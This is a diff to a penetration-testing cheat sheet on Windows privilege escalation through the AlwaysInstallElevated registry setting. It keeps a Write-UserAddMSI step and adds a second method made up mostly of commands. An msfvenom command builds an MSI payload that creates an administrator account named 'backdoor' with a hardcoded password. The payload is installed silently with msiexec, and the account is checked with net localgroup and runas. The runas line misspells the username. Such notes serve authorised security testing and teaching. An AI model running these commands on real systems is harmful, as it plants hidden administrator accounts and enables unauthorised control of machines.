@@ -19,6 +19,7 @@ Get-RegistryAlwaysInstallElevated
 
 If the last command returns True, system is vulnerable.
 
+## Exploitation Method 1 - Required GUI/RDP
 You can add an admin user by typing the following command.
 
 ```
@@ -27,7 +28,25 @@ Write-UserAddMSI
 
 You will get a prompt to enter the username and the password for the new user.
 
-Another way https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
+## Exploitation Method 2
+
+https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
+
+Generate a msfvenom payload in msi format.
+
+`msfvenom -p windows/adduser USER=backdoor PASS=Pass@1234 -f msi -o setup.msi`
+
+Install the payload using
+
+`msiexec /quiet /qn /i C:\Windows\Temp\setup.msi`
+
+Check that the user was created 
+
+`net localgroup Administrators`
+
+Verify user
+
+`C:\Windows\System32> runas /user:backfoor "dir C:\Users\Administrator"`
 
 
 ### References
